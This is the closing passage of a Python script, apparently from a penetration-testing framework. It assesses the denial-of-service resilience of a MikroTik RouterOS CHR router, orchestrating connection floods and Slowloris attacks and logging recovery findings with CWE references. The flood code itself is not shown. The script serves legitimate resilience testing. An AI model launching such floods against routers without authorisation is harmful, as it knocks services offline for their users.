                    f"Verify {svc_name} is responsive after all DoS testing",
                    f"{'Responsive' if responds else 'NOT RESPONDING'}",
                    anomaly=not responds)
        if not responds:
            all_up = False

    if not all_up:
        ec.add_finding("HIGH",
                       "Not all services recovered after DoS testing",
                       "One or more services remained unresponsive after all DoS "
                       "testing and recovery periods. Manual intervention may be "
                       "required to restore full service.",
                       cwe="CWE-400",
                       evidence_refs=["recovery_final"])

    # Check for orphaned sessions
    post_sessions = get_active_sessions()
    orphan_count = len(post_sessions) - baseline["active_sessions"]
    ec.add_test("recovery", "Orphaned sessions after recovery",
                "Check for sessions left behind after all connections closed",
                f"{len(post_sessions)} active (baseline was {baseline['active_sessions']}), "
                f"delta={orphan_count}",
                details={"current": len(post_sessions),
                         "baseline": baseline["active_sessions"],
                         "delta": orphan_count,
                         "sessions": post_sessions},
                anomaly=orphan_count > 3)

    if orphan_count > 3:
        ec.add_finding("LOW",
                       "Orphaned sessions after DoS testing",
                       f"{orphan_count} sessions remain active above the pre-test baseline "
                       f"after all connections were closed and recovery completed. "
                       f"This may indicate a session cleanup issue.",
                       cwe="CWE-404",
                       evidence_refs=["recovery_orphaned"])

    return recovery_results


# ══════════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════════

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — DoS Resilience Assessment")
    log(f"Target: {TARGET}")
    log(f"Phase: 6")
    log("=" * 60)

    # Verify router is alive before starting
    status = check_router_alive()
    if not status.get("alive"):
        log("FATAL: Router is not responding. Cannot proceed.")
        return
    log(f"Router is alive: version={status.get('version')}, uptime={status.get('uptime')}")

    ec = EvidenceCollector("attack_dos_resilience.py", phase=6)

    # Section 1: Baseline
    baseline = measure_baseline(ec)

    # Section 2: Per-service connection floods
    flood_results, total_crashes = run_connection_floods(ec, baseline)

    # Verify router is still alive after floods
    status = check_router_alive()
    if not status.get("alive"):
        log("Router went down after floods. Waiting for recovery...")
        wait_for_router(max_wait=120)

    # Section 3: Slowloris attacks
    run_slowloris(ec, baseline)

    # Verify router is still alive after slowloris
    status = check_router_alive()
    if not status.get("alive"):
        log("Router went down after slowloris. Waiting for recovery...")
        wait_for_router(max_wait=120)

    # Section 4: Resource monitoring (comprehensive post-test check)
    run_resource_monitoring(ec, baseline)

    # Section 5: Recovery testing
    recovery_results = run_recovery_tests(ec, baseline)

    # Final router check
    final_status = check_router_alive()
    log(f"Final router status: alive={final_status.get('alive')}, "
        f"uptime={final_status.get('uptime')}")

    # Save evidence and pull logs
    ec.save("dos_resilience.json")
    ec.summary()


if __name__ == "__main__":
    main()
